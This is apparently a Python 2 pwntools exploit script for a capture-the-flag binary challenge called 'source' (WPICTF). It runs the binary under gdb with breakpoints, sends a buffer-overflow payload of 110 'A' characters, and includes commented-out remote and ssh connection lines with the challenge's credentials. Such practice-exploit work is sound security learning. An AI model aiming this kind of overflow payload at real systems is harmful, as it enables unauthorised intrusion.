from pwn import *
# context.log_level = 'debug'
TARGET = './source'
HOST = 'source.wpictf.xyz'
PORT = 31337
USER = 'source'
PASS = 'sourcelocker'


r = process(TARGET)
# r = remote(HOST, PORT)
# r = ssh(USER, HOST, PORT, PASS)
# r = r.run('')
gdb.attach(r, '''
set disable-randomization on
b*0x40077d
b*0x400791
c
''')
elf = ELF(TARGET)

def dbg(val): print "\t-> %s: 0x%x" % (val, eval(val))

r.recvuntil('5513/')

payload = ''
payload += 'A' * 110
r.sendline(payload) 

r.interactive()
r.close()
